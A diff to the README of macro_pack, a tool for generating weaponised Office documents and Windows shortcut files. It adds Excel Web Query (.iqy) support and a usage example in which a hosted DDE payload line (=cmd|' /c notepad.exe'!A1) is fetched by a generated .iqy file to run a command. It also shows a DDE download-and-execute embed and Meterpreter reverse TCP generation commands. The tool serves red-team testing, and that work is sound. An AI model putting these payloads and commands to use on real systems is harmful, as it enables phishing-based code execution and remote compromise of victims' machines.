@@ -70,6 +70,7 @@ Shortcuts/Shell supported formats are:
 * Settings Shortcuts (.settingcontent-ms)
 * MS Library (.library-ms)
 * Setup Information (.inf)
+* Excel Web Query (.iqy)
 
 Note that all scripting and shortcuts formats (except LNK) can be generated on Linux version of macro\_pack as well.
 
@@ -181,8 +182,19 @@ echo calc.exe | macro_pack.exe --dde -G calc.xslx
 ```bash
 # 1 Change the target file URL in resources\community\ps_dl_exec.cmd
 # 2 Embed download execute cmd in document
-python macro_pack.py --dde -f ..\resources\community\ps_dl_exec.cmd -G DDE.doc
+macro_pack.exe --dde -f ..\resources\community\ps_dl_exec.cmd -G DDE.doc
 ```
+
+- Run command (notepad.exe) via Excel web query file and DDE
+```bash
+# 1 Create dde.dat file with next content
+=cmd|' /c notepad.exe'!A1
+# 2 Host dde.dat on webserver, ex. using macro_pack -l
+# 3 Generate .iqy file
+macro_pack.exe -G dde.iqy
+```
+
+<p align="center"><img src="./assets/iqy_dde.PNG" alt="IQY demo"></p>
 
 
  - Generate obfuscated Meterpreter reverse TCP VBS file and run it  
@@ -299,7 +311,7 @@ echo 192.168.0.5 4444 | macro_pack.exe -t METERPRETER -o -G "\\192.168.0.8\c$\us
         Supported Ms Office extensions are: doc, docm, docx, dotm, xls, xlsm, xslx, xltm, pptm, potm, vsd, vsdm, mpp.
         Note: Ms Office file generation requires Windows OS with right MS Office application installed.
         Supported Visual Basic scripts extensions are: vba, vbs, wsf, wsc, sct, hta, xsl.
-        Supported shortcuts/shell extensions are: lnk, scf, url, glk, settingcontent-ms, library-ms, inf
+        Supported shortcuts/shell extensions are: lnk, scf, url, glk, settingcontent-ms, library-ms, inf, iqy
     
     -e, --embed=EMBEDDED_FILE_PATH Will embed the given file in the body of the generated document.
          Use with EMBED_EXE template to auto drop and exec the file or with EMBED_DLL to drop/load the embedded dll.
